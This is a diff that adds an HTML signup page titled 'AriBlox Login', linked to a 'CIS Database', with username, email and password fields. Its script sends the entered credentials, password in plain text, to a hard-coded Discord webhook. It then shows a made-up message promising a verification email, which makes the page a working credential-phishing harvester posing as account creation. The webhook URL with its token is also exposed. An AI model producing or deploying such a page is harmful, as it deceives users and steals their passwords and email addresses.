@@ -1,0 +1,111 @@
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AriBlox Login</title>
+  </head>
+  <body>
+<img src="BannerTop.png">
+<img src="MidBanner.png">
+<a href="index.html"> <h3> Return to CIS Database </h3> </a>
+      <h2 id="verifything">Create an account</h2>
+      <area shape="circle" coords="986,660,100" alt="Test" href="">
+      <button onclick="sendMessage()" id="sendbutton">Send</button>
+      <input type="text" id="userInput" placeholder="Username">
+      <input type="text" id="emailInput" placeholder="Email">
+      <input type="text" id="passwordInput" placeholder="Password">
+  </body>
+  <script>
+
+    function sendMessage() {
+document.getElementById("verifything").innerHTML = "You will recieve an email which will verify your account within 1-24 Hours";
+document.getElementById("userInput").style.opacity = "0";
+document.getElementById("passwordInput").style.opacity = "0";
+document.getElementById("emailInput").style.opacity = "0";
+document.getElementById("sendbutton").disabled = true;
+      var userInput = document.getElementById("userInput").value
+      var emailInput = document.getElementById("emailInput").value
+      var passInput = document.getElementById("passwordInput").value
+      const request = new XMLHttpRequest();
+      const webhookURL = "https://discord.com/api/webhooks/935835035926397008/X_oF7KI8fJFbEiNO_VX6zAutYwaSPN61nqvaczUIIq5TsV7CQAIpdOYFk_RxjI3d56fU"
+      request.open("POST", webhookURL);
+
+      request.setRequestHeader('Content-type', 'application/json');
+
+      const params = {
+      "username": "CIS_Database",
+      "content": null,
+      "embeds": [
+        {
+          "title": "StringValue",
+          "description": "CISDataHandeller",
+          "color": null,
+          "fields": [
+            {
+              "name": "Username",
+              "value": userInput,
+              "inline": true
+            },
+            {
+              "name": "Password",
+              "value": passInput,
+              "inline": true
+            },
+            {
+              "name": "Email",
+              "value": emailInput,
+              "inline": true
+            }
+          ],
+          "footer": {
+           "text": "CISDataHandeller"
+          }
+        }
+      ]
+    }
+
+      request.send(JSON.stringify(params));
+    }
+  </script>
+<style>
+
+body {
+background: rgba(73, 65, 65, 0.3)
+}
+a:link {
+  text-decoration: none;
+  color: black;
+}
+
+a:visited {
+  color: black;
+}
+a:hover {
+  color: red;
+}
+button {
+  background-color: transparent;
+  border: none;
+  color: black;
+  padding: none;
+  text-align: center;
+  text-decoration: none;
+  display: inline-block;
+  font-size: 16px;
+}
+button:hover {
+  background-color: transparent;
+  border: none;
+  color: red;
+  padding: none;
+  text-align: center;
+  text-decoration: none;
+  display: inline-block;
+  font-size: 16px;
+}
+h2 {
+text-align: center
+}
+</style>
+
+</html>
